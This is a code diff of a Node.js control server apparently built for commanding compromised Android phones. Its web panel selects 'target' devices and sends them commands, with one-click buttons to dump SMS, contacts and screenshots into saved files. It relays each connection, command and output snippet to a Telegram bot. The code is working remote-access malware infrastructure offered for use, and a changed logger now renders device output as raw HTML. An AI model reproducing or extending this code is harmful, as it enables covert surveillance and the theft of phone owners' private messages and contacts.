@@ -1,15 +1,13 @@
-// index.js - Advanced Terminal Server + Telegram Bot + Gemini AI + File Manager
+// index.js - Advanced Terminal Server + Telegram Bot + Gemini AI + Smart File Manager
 require('dotenv').config();
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
 const cors = require('cors');
 const { GoogleGenerativeAI } = require('@google/generative-ai');
-const { Adb } = require('@devicefarmer/adbkit');
-const multer = require('multer');
-const { v4: uuidv4 } = require('uuid');
 const fs = require('fs');
 const path = require('path');
+const { v4: uuidv4 } = require('uuid');
 
 // --- File System Setup ---
 const FILES_DIR = path.join(__dirname, 'file_manager_data');
@@ -22,18 +20,16 @@ const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    maxHttpBufferSize: 1e8 // 100MB buffer for large files
+    maxHttpBufferSize: 5e8 // 500MB buffer for large screenshots/APKs
 });
-const upload = multer({ dest: 'uploads/' });
 
 // Middleware
 app.use(cors());
-app.use(express.json({ limit: '100mb' }));
-app.use(express.urlencoded({ limit: '100mb', extended: true }));
+app.use(express.json({ limit: '500mb' }));
+app.use(express.urlencoded({ limit: '500mb', extended: true }));
 
-// Initialize AI & ADB
+// Initialize AI
 const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY || '');
-const adbClient = Adb.createClient();
 
 // Data Storage
 const connectedDevices = new Map(); 
@@ -43,19 +39,15 @@ const pendingCommands = new Map();
 async function sendTelegramLog(message) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
-
     if (!token || !chatId) return;
-
     try {
         let text = message.length > 4000 ? message.substring(0, 3990) + "\n...[TRUNCATED]" : message;
-        await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
         });
-    } catch (err) {
-        console.error("Telegram Send Error:", err.message);
-    }
+    } catch (err) {}
 }
 
 // --- Authentication Middleware ---
@@ -67,74 +59,86 @@ const authMiddleware = (req, res, next) => {
     next();
 };
 
-// ==================== WEB UI (NEON HACKER THEME + SPA) ====================
+// ==================== WEB UI (NEON HACKER THEME V3) ====================
 const webUIHTML = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Neon Hacker OS</title>
+    <title>Advanced Hacker OS</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --neon: #0f0; --bg: #050505; --panel: #111; --dark-green: #003300; --danger: #ff3333; }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        :root { --neon: #00ff41; --bg: #0a0a0a; --panel: #111; --dark-green: #002200; --danger: #ff3333; --border: #004400; }
+        * { box-sizing: border-box; margin: 0; padding: 0; scroll-behavior: smooth; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 3px; }
+
         /* Navbar */
-        nav { display: flex; background: var(--panel); border-bottom: 2px solid var(--dark-green); }
-        nav button { flex: 1; background: transparent; color: #555; border: none; padding: 15px 5px; font-size: 16px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; }
-        nav button.active { color: var(--neon); border-bottom: 3px solid var(--neon); background: var(--dark-green); text-shadow: 0 0 5px var(--neon); }
+        nav { display: flex; background: var(--panel); border-bottom: 1px solid var(--neon); box-shadow: 0 2px 10px rgba(0,255,65,0.2); z-index: 10; }
+        nav button { flex: 1; background: transparent; color: #444; border: none; padding: 15px 5px; font-size: 14px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; letter-spacing: 1px; }
+        nav button.active { color: var(--bg); background: var(--neon); text-shadow: none; }
         nav button i { margin-right: 5px; }
 
-        /* App Container */
+        /* Main Container */
         .app-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; padding: 10px; position: relative; }
-        .tab-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.3s; }
+        .tab-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.3s ease-in-out; }
         .tab-content.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        /* General UI Elements */
+        .top-bar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
+        input, select, button { background: var(--panel); color: var(--neon); border: 1px solid var(--border); padding: 12px; border-radius: 4px; font-family: inherit; font-size: 14px; outline: none; }
+        input:focus, select:focus { border-color: var(--neon); box-shadow: 0 0 8px rgba(0,255,65,0.3); }
+        .btn { background: var(--dark-green); cursor: pointer; font-weight: bold; text-transform: uppercase; border: 1px solid var(--neon); transition: 0.2s; }
+        .btn:hover { background: var(--neon); color: var(--bg); box-shadow: 0 0 15px var(--neon); }
+        .btn-danger { background: #200; border-color: var(--danger); color: var(--danger); }
+        .btn-danger:hover { background: var(--danger); color: #fff; box-shadow: 0 0 15px var(--danger); }
+        .flex-1 { flex: 1; min-width: 120px; }
 
-        /* General Forms */
-        .top-bar { display: flex; gap: 10px; margin-bottom: 10px; flex-wrap: wrap; }
-        input, select, button { background: var(--panel); color: var(--neon); border: 1px solid #0a0; padding: 12px; border-radius: 4px; font-family: inherit; font-size: 14px; outline: none; }
-        input:focus, select:focus { box-shadow: 0 0 8px var(--dark-green); }
-        .btn { background: var(--dark-green); cursor: pointer; font-weight: bold; text-transform: uppercase; }
-        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
-        .btn-danger { background: #300; border-color: var(--danger); color: var(--danger); }
-        .btn-danger:hover { background: var(--danger); color: #000; box-shadow: 0 0 10px var(--danger); }
-        .flex-1 { flex: 1; min-width: 150px; }
+        /* --- HOME TAB ENHANCEMENTS --- */
+        .home-header { text-align: center; margin: 20px 0; padding-bottom: 20px; border-bottom: 1px dashed var(--border); }
+        .home-header h1 { font-size: 1.8rem; text-shadow: 0 0 10px var(--neon); letter-spacing: 2px; margin-bottom: 5px; }
+        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; overflow-y: auto; padding-bottom: 20px; }
+        .stat-card { background: linear-gradient(180deg, var(--panel), var(--bg)); border: 1px solid var(--border); padding: 20px 10px; text-align: center; border-radius: 6px; box-shadow: 0 4px 6px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
+        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--neon); box-shadow: 0 0 10px var(--neon); }
+        .stat-card h3 { font-size: 2rem; margin-bottom: 5px; color: #fff; text-shadow: 0 0 8px var(--neon); }
+        .stat-card p { font-size: 0.8rem; opacity: 0.8; text-transform: uppercase; }
+        .quick-actions { margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
+        .quick-actions button { flex: 1; min-width: 48%; }
 
-        /* Home Tab */
-        .dashboard { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
-        .card { background: var(--panel); border: 1px solid #0a0; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 0 10px rgba(0,255,0,0.1); }
-        .card h3 { font-size: 2rem; margin-bottom: 10px; text-shadow: 0 0 10px var(--neon); }
+        /* --- TERMINAL TAB ENHANCEMENTS --- */
+        #terminal-output { flex-grow: 1; background: #000; border: 1px solid var(--neon); border-radius: 4px; padding: 12px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-word; margin-bottom: 10px; box-shadow: inset 0 0 20px rgba(0,255,65,0.1); line-height: 1.4; }
+        .input-area { display: flex; align-items: center; background: var(--panel); border: 1px solid var(--neon); border-radius: 4px; padding: 2px 5px; box-shadow: 0 0 10px rgba(0,255,65,0.1); }
+        .prompt { color: #fff; font-weight: bold; padding-right: 8px; border-right: 1px solid var(--border); margin-right: 8px; font-size: 13px; }
+        #cmdInput { border: none; background: transparent; flex-grow: 1; box-shadow: none; padding: 12px 5px; color: var(--neon); }
+        #cmdInput::placeholder { color: #005500; }
 
-        /* Terminal Tab */
-        #terminal-output { flex-grow: 1; background: #000; border: 1px solid #050; border-radius: 4px; padding: 15px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-all; margin-bottom: 10px; box-shadow: inset 0 0 20px #000; }
-        .input-area { display: flex; gap: 8px; background: var(--panel); border: 1px solid #0a0; padding: 5px; border-radius: 4px; }
-        .prompt { color: var(--neon); font-weight: bold; padding: 10px; }
-        #cmdInput { border: none; background: transparent; flex-grow: 1; box-shadow: none; padding: 10px 0; }
-        
-        /* File Manager Tab */
-        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid #050; background: var(--panel); border-radius: 4px; }
-        .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; border-bottom: 1px solid #030; transition: 0.2s; }
-        .file-item:hover { background: var(--dark-green); }
-        .file-info { display: flex; align-items: center; gap: 10px; }
-        .file-info i { font-size: 20px; }
-        .file-actions button { padding: 8px 12px; margin-left: 5px; font-size: 12px; }
+        /* --- FILE MANAGER TAB ENHANCEMENTS --- */
+        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid var(--border); background: var(--panel); border-radius: 4px; }
+        .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid var(--border); transition: background 0.2s; }
+        .file-item:hover { background: rgba(0, 255, 65, 0.1); }
+        .file-info { display: flex; align-items: center; gap: 12px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+        .file-info i { font-size: 18px; width: 20px; text-align: center; }
+        .file-info span { font-size: 13px; }
+        .file-actions { display: flex; gap: 6px; }
+        .file-actions button { padding: 8px 10px; font-size: 12px; }
 
-        /* Colors */
-        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #55ffff; } .log-ai { color: #ffff55; }
+        /* Colors for Terminal Logs */
+        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #00aaff; } .log-ai { color: #ffff55; } .log-sys { color: #888; }
 
-        /* Mobile Adjustments */
         @media (max-width: 600px) {
             nav button { font-size: 12px; padding: 12px 2px; }
-            .top-bar { flex-direction: column; }
-            .input-area { flex-direction: column; padding: 10px; }
-            .prompt { padding: 0 0 5px 0; border-bottom: 1px solid #050; text-align: center; }
-            #cmdInput { padding: 10px; text-align: center; }
-            .file-item { flex-direction: column; align-items: flex-start; gap: 10px; }
-            .file-actions { width: 100%; display: flex; justify-content: space-between; }
+            .home-header h1 { font-size: 1.4rem; }
+            .input-area { flex-wrap: wrap; }
+            .prompt { border-right: none; border-bottom: 1px dashed var(--border); width: 100%; text-align: center; padding: 5px 0; margin: 0; }
+            #cmdInput { width: 100%; text-align: center; }
+            .file-item { flex-direction: column; align-items: stretch; gap: 8px; }
+            .file-actions { justify-content: space-between; }
             .file-actions button { flex: 1; }
         }
     </style>
@@ -154,42 +158,60 @@ const webUIHTML = `
             <select id="deviceSelect" class="flex-1">
                 <option value="">Select Target Device...</option>
             </select>
-            <button class="btn" onclick="loadDevices()"><i class="fas fa-sync"></i></button>
+            <button class="btn" onclick="loadDevices()" title="Refresh Devices"><i class="fas fa-sync-alt"></i></button>
         </div>
 
         <div id="tab-home" class="tab-content active">
-            <h2 style="text-align:center; margin-top: 20px; text-shadow: 0 0 10px var(--neon);">SYSTEM DASHBOARD</h2>
-            <div class="dashboard">
-                <div class="card">
+            <div class="home-header">
+                <h1>⚡ NEON SYSTEM CORE ⚡</h1>
+                <p style="color:#008800; font-size:12px;">Secure connection established.</p>
+            </div>
+            
+            <div class="dashboard-grid">
+                <div class="stat-card">
                     <h3 id="stat-devices">0</h3>
-                    <p>Connected Devices</p>
+                    <p>Active Devices</p>
                 </div>
-                <div class="card" onclick="switchTab('terminal')" style="cursor:pointer">
-                    <h3><i class="fas fa-terminal"></i></h3>
-                    <p>Launch Terminal</p>
+                <div class="stat-card">
+                    <h3 id="stat-files">0</h3>
+                    <p>Saved Files</p>
                 </div>
-                <div class="card" onclick="switchTab('files')" style="cursor:pointer">
-                    <h3><i class="fas fa-folder"></i></h3>
-                    <p>Open File Manager</p>
+                <div class="stat-card">
+                    <h3 style="color:#00aaff">ONLINE</h3>
+                    <p>Server Status</p>
                 </div>
+            </div>
+
+            <h4 style="margin: 15px 0 5px; color:#555; text-transform:uppercase;">Quick Execution</h4>
+            <div class="quick-actions">
+                <button class="btn" onclick="quickCmd('ls')"><i class="fas fa-list"></i> List Dir</button>
+                <button class="btn" onclick="quickCmd('sms > sms_dump.txt')"><i class="fas fa-envelope"></i> Get SMS</button>
+                <button class="btn" onclick="quickCmd('contact > contacts.json')"><i class="fas fa-address-book"></i> Contacts</button>
+                <button class="btn" onclick="quickCmd('screenshot > screen.png')"><i class="fas fa-camera"></i> Screenshot</button>
             </div>
         </div>
 
         <div id="tab-terminal" class="tab-content">
-            <div id="terminal-output">System initialized... Ready for commands.\nTip: Use 'cmd > filename.txt' to save output directly to File Manager.\n</div>
+            <div id="terminal-output">
+<span class="log-sys">==============================================
+ SYSTEM INITIALIZED... READY FOR COMMANDS.
+==============================================</span>
+<span class="log-sys">Tip: Use 'cmd > filename.txt' or 'screenshot > photo.png' to auto-save output to File Manager.</span>
+</div>
             <div class="input-area">
-                <span class="prompt">root@system:~#</span>
-                <input type="text" id="cmdInput" placeholder="Command / 'ai <query>' / 'cmd > file.txt'" onkeypress="if(event.key === 'Enter') processInput()">
-                <button class="btn" onclick="processInput()"><i class="fas fa-paper-plane"></i></button>
+                <span class="prompt" id="prompt-text">root@device:~#</span>
+                <input type="text" id="cmdInput" placeholder="Enter command or 'ai <query>'..." onkeypress="if(event.key === 'Enter') processInput()" autocomplete="off">
+                <button class="btn" onclick="processInput()" style="margin-left:5px;"><i class="fas fa-chevron-right"></i></button>
             </div>
         </div>
 
         <div id="tab-files" class="tab-content">
-            <div class="top-bar">
-                <button class="btn flex-1" onclick="loadFiles()"><i class="fas fa-sync"></i> Refresh Files</button>
+            <div class="top-bar" style="margin-bottom: 5px;">
+                <button class="btn flex-1" onclick="loadFiles()"><i class="fas fa-sync"></i> Refresh Data</button>
             </div>
             <div class="file-list" id="fileList">
-                </div>
+                <div style="padding:15px; text-align:center; color:#555;">Loading files...</div>
+            </div>
         </div>
 
     </div>
@@ -197,34 +219,40 @@ const webUIHTML = `
     <script>
         const term = document.getElementById('terminal-output');
         const tokenInput = document.getElementById('authToken');
+        const deviceSelect = document.getElementById('deviceSelect');
 
         window.onload = () => {
             const savedToken = localStorage.getItem('hackerToken');
             if (savedToken) {
                 tokenInput.value = savedToken;
-                setTimeout(loadDevices, 500);
+                setTimeout(() => { loadDevices(); loadFiles(); }, 500);
             }
         };
 
-        // UI TAB SWITCHER
+        deviceSelect.addEventListener('change', () => {
+            const val = deviceSelect.value;
+            document.getElementById('prompt-text').innerText = val ? \`root@\${val.substring(0,5)}:~#\` : 'root@system:~#';
+        });
+
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
             document.getElementById('tab-' + tabId).classList.add('active');
             document.getElementById('nav-' + tabId).classList.add('active');
             if(tabId === 'files') loadFiles();
+            if(tabId === 'home') loadFiles(true); // silent refresh for stats
         }
 
-        // LOGGER
+        // Auto Smooth Scroll
         function log(msg, type = 'normal') {
             const div = document.createElement('div');
             div.className = 'log-' + type;
-            div.textContent = msg;
+            div.innerHTML = msg.replace(/\\n/g, '<br>');
             term.appendChild(div);
-            term.scrollTop = term.scrollHeight;
+            // Smooth scroll to bottom
+            term.scrollTo({ top: term.scrollHeight, behavior: 'smooth' });
         }
 
-        // API CALLS
         async function fetchAPI(endpoint, options = {}) {
             const token = tokenInput.value;
             if (token) localStorage.setItem('hackerToken', token);
@@ -235,30 +263,32 @@ const webUIHTML = `
             return data;
         }
 
-        // DEVICES
         async function loadDevices() {
             try {
                 const data = await fetchAPI('/api/devices');
-                const select = document.getElementById('deviceSelect');
-                select.innerHTML = '<option value="">Select Target Device...</option>';
+                const prevVal = deviceSelect.value;
+                deviceSelect.innerHTML = '<option value="">Select Target Device...</option>';
                 data.devices.forEach(d => {
-                    select.innerHTML += \`<option value="\${d.id}">\${d.model} (\${d.id})</option>\`;
+                    deviceSelect.innerHTML += \`<option value="\${d.id}">\${d.model} (\${d.id})</option>\`;
                 });
+                if(prevVal) deviceSelect.value = prevVal; // preserve selection
                 document.getElementById('stat-devices').innerText = data.devices.length;
-            } catch (err) {
-                console.error(err);
-            }
+            } catch (err) { console.error(err); }
         }
 
-        // TERMINAL INPUT PROCESSOR
+        function quickCmd(cmd) {
+            switchTab('terminal');
+            document.getElementById('cmdInput').value = cmd;
+            processInput();
+        }
+
         async function processInput() {
-            const deviceId = document.getElementById('deviceSelect').value;
+            const deviceId = deviceSelect.value;
             const cmdInput = document.getElementById('cmdInput');
             let input = cmdInput.value.trim();
             if (!input) return;
             cmdInput.value = '';
 
-            // AI Check
             if (input.startsWith('ai ')) {
                 log('> ' + input, 'cmd');
                 try {
@@ -268,9 +298,8 @@ const webUIHTML = `
                 return;
             }
 
-            if (!deviceId) return log('[!] Error: No device selected.', 'error');
+            if (!deviceId) return log('[!] Target device not selected.', 'error');
 
-            // FILE SAVE CHECK (Syntax: command > filename.ext)
             let saveAs = null;
             if (input.includes(' > ')) {
                 const parts = input.split(' > ');
@@ -278,7 +307,7 @@ const webUIHTML = `
                 saveAs = parts[1].trim();
             }
 
-            log('> ' + input + (saveAs ? \` (Saving to \${saveAs}...)\` : ''), 'cmd');
+            log('> ' + input + (saveAs ? \` <span style="color:#888;">(Redirecting output to \${saveAs}...)</span>\` : ''), 'cmd');
             
             try {
                 const data = await fetchAPI('/api/command/' + deviceId, {
@@ -286,50 +315,74 @@ const webUIHTML = `
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ command: input, saveAs: saveAs })
                 });
+                
                 if(data.savedToFile) {
-                    log(\`[✔] Output saved to File Manager as \${saveAs}\`, 'success');
+                    log(\`[✔] Success: Output saved in File Manager as <b>\${saveAs}</b>\`, 'success');
                 } else {
-                    log(data.result || '[Execution complete. No output.]', 'success');
+                    let out = typeof data.result === 'object' ? JSON.stringify(data.result, null, 2) : data.result;
+                    log(out || '[Execution complete. No output.]', 'success');
                 }
-            } catch (err) {
-                log('[!] Failed: ' + err.message, 'error');
-            }
+            } catch (err) { log('[!] Failed: ' + err.message, 'error'); }
         }
 
-        // FILE MANAGER CONTROLS
-        async function loadFiles() {
+        // --- FILE MANAGER CONTROLS ---
+        function getFileIcon(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            if(['png','jpg','jpeg'].includes(ext)) return { icon: 'fa-image', color: '#00aaff' };
+            if(['apk'].includes(ext)) return { icon: 'fa-android', color: '#a4c639' };
+            if(['json'].includes(ext)) return { icon: 'fa-file-code', color: '#ffff55' };
+            if(['mp4','mp3','wav'].includes(ext)) return { icon: 'fa-photo-video', color: '#ff55aa' };
+            return { icon: 'fa-file-alt', color: '#00ff41' };
+        }
+
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'], i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+        }
+
+        async function loadFiles(silent = false) {
             const list = document.getElementById('fileList');
-            list.innerHTML = '<div style="padding:15px">Loading files...</div>';
+            if(!silent) list.innerHTML = '<div style="padding:15px; text-align:center;">Scanning system...</div>';
             try {
                 const data = await fetchAPI('/api/files');
-                list.innerHTML = '';
-                if(data.files.length === 0) return list.innerHTML = '<div style="padding:15px">No files found. Run a command with "> filename" to save data.</div>';
+                document.getElementById('stat-files').innerText = data.files.length;
                 
-                data.files.forEach(f => {
-                    const icon = f.name.endsWith('.png') || f.name.endsWith('.jpg') ? 'fa-image' : f.name.endsWith('.apk') ? 'fa-android' : 'fa-file-alt';
+                if(silent) return; // Only update stats if silent
+
+                list.innerHTML = '';
+                if(data.files.length === 0) return list.innerHTML = '<div style="padding:20px; text-align:center; color:#555;">No files found.<br>Use <b>command > name.txt</b> in terminal to save data.</div>';
+                
+                // Sort by newest first
+                data.files.sort((a,b) => b.mtime - a.mtime).forEach(f => {
+                    const iconData = getFileIcon(f.name);
                     list.innerHTML += \`
                         <div class="file-item">
-                            <div class="file-info"><i class="fas \${icon}"></i> <span>\${f.name} <small style="color:#0a0">(\${f.size} bytes)</small></span></div>
+                            <div class="file-info" title="\${f.name}">
+                                <i class="fas \${iconData.icon}" style="color: \${iconData.color};"></i> 
+                                <span>\${f.name} <br><small style="color:#555">\${formatBytes(f.size)}</small></span>
+                            </div>
                             <div class="file-actions">
-                                <button class="btn" onclick="downloadFile('\${f.name}')"><i class="fas fa-download"></i></button>
+                                <button class="btn" onclick="viewFile('\${f.name}')" title="View/Download"><i class="fas fa-eye"></i></button>
                                 <button class="btn btn-danger" onclick="deleteFile('\${f.name}')"><i class="fas fa-trash"></i></button>
                             </div>
                         </div>
                     \`;
                 });
-            } catch(e) { list.innerHTML = '<div class="log-error" style="padding:15px">Error loading files: ' + e.message + '</div>'; }
+            } catch(e) { if(!silent) list.innerHTML = '<div class="log-error" style="padding:15px">Error: ' + e.message + '</div>'; }
         }
 
-        async function downloadFile(name) {
+        function viewFile(name) {
             const token = tokenInput.value;
+            // Open in new tab. Browser will render images/txt, or prompt download for APKs.
             window.open(\`/api/files/download/\${name}?token=\${token}\`, '_blank');
         }
 
         async function deleteFile(name) {
-            if(!confirm('Delete ' + name + '?')) return;
+            if(!confirm('Permanently delete ' + name + '?')) return;
             try {
                 await fetchAPI('/api/files/delete/' + name, { method: 'DELETE' });
-                loadFiles(); // Refresh
+                loadFiles(); 
             } catch(e) { alert('Delete failed: ' + e.message); }
         }
     </script>
@@ -345,40 +398,35 @@ app.get('/api/devices', authMiddleware, (req, res) => {
     try {
         const devices = Array.from(connectedDevices.values()).map(d => ({
             id: d.socket.deviceId,
-            model: d.deviceInfo?.model || 'Android Device',
+            model: d.deviceInfo?.model || 'Android Target',
         }));
         res.json({ success: true, devices });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
+    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
 
-// AI Processing
 app.post('/api/ai/chat', authMiddleware, async (req, res) => {
     try {
-        if(!process.env.GEMINI_API_KEY) throw new Error("Gemini API Key missing.");
+        if(!process.env.GEMINI_API_KEY) throw new Error("Gemini Key missing.");
         const model = genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });
-        const result = await model.generateContent("System context: Expert hacker/linux admin. " + req.body.prompt);
+        const result = await model.generateContent("Context: Hacker OS Terminal. User: " + req.body.prompt);
         res.json({ success: true, response: result.response.text() });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
+    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
 
-// Execute Command & Optional File Save Route
+// --- SMART COMMAND EXECUTION & FILE SAVING ---
 app.post('/api/command/:deviceId', authMiddleware, async (req, res) => {
     const { deviceId } = req.params;
     const { command, saveAs } = req.body;
 
     const device = connectedDevices.get(deviceId);
-    if (!device) return res.status(404).json({ success: false, error: 'Device disconnected' });
+    if (!device) return res.status(404).json({ success: false, error: 'Device offline' });
 
-    const requestId = Date.now() + '-' + uuidv4().substring(0,8);
+    const requestId = Date.now() + '-' + uuidv4().substring(0,6);
     const commandPromise = new Promise((resolve, reject) => {
         const timer = setTimeout(() => {
             pendingCommands.delete(requestId);
-            reject(new Error('Device timed out'));
-        }, 60000); // 60s timeout for large dumps
+            reject(new Error('Device timed out (No response in 60s)'));
+        }, 60000); 
         pendingCommands.set(requestId, { resolve, reject, timer, command, deviceId }); 
     });
 
@@ -386,31 +434,36 @@ app.post('/api/command/:deviceId', authMiddleware, async (req, res) => {
         device.socket.emit('execute_command', { requestId, command });
         let result = await commandPromise;
 
-        // FILE SAVING LOGIC
+        // --- SMART FILE SAVER (Handles Text, JSON, and Base64 Images/APKs) ---
         if (saveAs) {
-            const safeName = path.basename(saveAs); // Prevent directory traversal
+            const safeName = path.basename(saveAs); 
             const filePath = path.join(FILES_DIR, safeName);
             
-            // Check if result is base64 (crude check for images/apks)
-            const isBase64 = result.match(/^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$/);
-            const isBinaryTarget = safeName.endsWith('.png') || safeName.endsWith('.jpg') || safeName.endsWith('.apk') || safeName.endsWith('.mp4');
-            
-            if (isBinaryTarget && isBase64) {
-                // Decode base64 to binary
-                const buffer = Buffer.from(result, 'base64');
-                fs.writeFileSync(filePath, buffer);
+            // Determine if target file is binary based on extension
+            const isBinaryTarget = safeName.match(/\\.(png|jpg|jpeg|apk|mp4)$/i);
+
+            if (isBinaryTarget && typeof result === 'string') {
+                // If the app sends a Base64 string (with or without data URI prefix)
+                let base64Data = result.replace(/^data:.*?;base64,/, ""); 
+                
+                // Validate if it actually looks like base64
+                if (/^[A-Za-z0-9+/=\\s]+$/.test(base64Data)) {
+                    fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
+                } else {
+                    // Fallback: write as is if it's not base64
+                    fs.writeFileSync(filePath, result);
+                }
             } else {
-                // Save as raw text
-                fs.writeFileSync(filePath, result, 'utf8');
+                // Handle Text/JSON data (SMS, Contacts, Call logs)
+                let dataToWrite = typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result);
+                fs.writeFileSync(filePath, dataToWrite, 'utf8');
             }
             
             return res.json({ success: true, requestId, savedToFile: true, file: safeName });
         }
 
         res.json({ success: true, requestId, result });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
+    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
 
 // --- FILE MANAGER ROUTES ---
@@ -418,12 +471,10 @@ app.get('/api/files', authMiddleware, (req, res) => {
     try {
         const files = fs.readdirSync(FILES_DIR).map(name => {
             const stats = fs.statSync(path.join(FILES_DIR, name));
-            return { name, size: stats.size };
+            return { name, size: stats.size, mtime: stats.mtimeMs }; // Send modification time for sorting
         });
         res.json({ success: true, files });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
+    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
 
 app.get('/api/files/download/:name', authMiddleware, (req, res) => {
@@ -431,13 +482,11 @@ app.get('/api/files/download/:name', authMiddleware, (req, res) => {
         const safeName = path.basename(req.params.name);
         const filePath = path.join(FILES_DIR, safeName);
         if (fs.existsSync(filePath)) {
-            res.download(filePath);
+            res.sendFile(filePath); // sendFile allows browser to preview images/text natively
         } else {
-            res.status(404).send('File not found');
+            res.status(404).send('File missing or deleted.');
         }
-    } catch (error) {
-        res.status(500).send('Error downloading file');
-    }
+    } catch (error) { res.status(500).send('System Error.'); }
 });
 
 app.delete('/api/files/delete/:name', authMiddleware, (req, res) => {
@@ -450,11 +499,8 @@ app.delete('/api/files/delete/:name', authMiddleware, (req, res) => {
         } else {
             res.status(404).json({ success: false, error: 'File not found' });
         }
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
-    }
+    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
-
 
 // ==================== SOCKET.IO HANDLERS ====================
 io.on('connection', (socket) => {
@@ -468,7 +514,7 @@ io.on('connection', (socket) => {
         connectedDevices.set(deviceId, { socket, deviceInfo });
         socket.join('device:' + deviceId);
 
-        await sendTelegramLog("📱 <b>New Device Connected!</b>\nID: " + deviceId + "\nModel: " + socket.deviceInfo.model);
+        await sendTelegramLog("📱 <b>Target Locked!</b>\\nID: " + deviceId + "\\nModel: " + socket.deviceInfo.model);
         socket.emit('registered', { success: true });
     });
 
@@ -480,29 +526,28 @@ io.on('connection', (socket) => {
             clearTimeout(pending.timer);
             pendingCommands.delete(requestId);
 
-            // Log short output to telegram to avoid spam
-            let shortResult = typeof result === 'string' && result.length > 200 ? result.substring(0, 200) + '...[TRUNCATED]' : result;
+            // Small telegram log to prevent big payload crash
+            let strRes = typeof result === 'object' ? JSON.stringify(result).substring(0, 100) : String(result).substring(0, 100);
             let tgMsg = success 
-                ? "✅ <b>Command Success</b>\nDevice: " + pending.deviceId + "\nCmd: " + pending.command + "\nOutput:\n" + shortResult
-                : "❌ <b>Command Failed</b>\nDevice: " + pending.deviceId + "\nCmd: " + pending.command + "\nError:\n" + error;
+                ? "✅ <b>Cmd Success</b>\\nDevice: " + pending.deviceId + "\\nCmd: " + pending.command + "\\nResponse: " + strRes + "..."
+                : "❌ <b>Cmd Failed</b>\\nDevice: " + pending.deviceId + "\\nError: " + error;
 
             await sendTelegramLog(tgMsg);
 
             if (success) pending.resolve(result);
-            else pending.reject(new Error(error || 'Failed on device'));
+            else pending.reject(new Error(error || 'Execution failed on target.'));
         }
     });
 
     socket.on('disconnect', async () => {
         if (socket.deviceId) {
             connectedDevices.delete(socket.deviceId);
-            await sendTelegramLog("⚠️ <b>Device Disconnected</b>\nID: " + socket.deviceId);
+            await sendTelegramLog("⚠️ <b>Connection Lost</b>\\nID: " + socket.deviceId);
         }
     });
 });
 
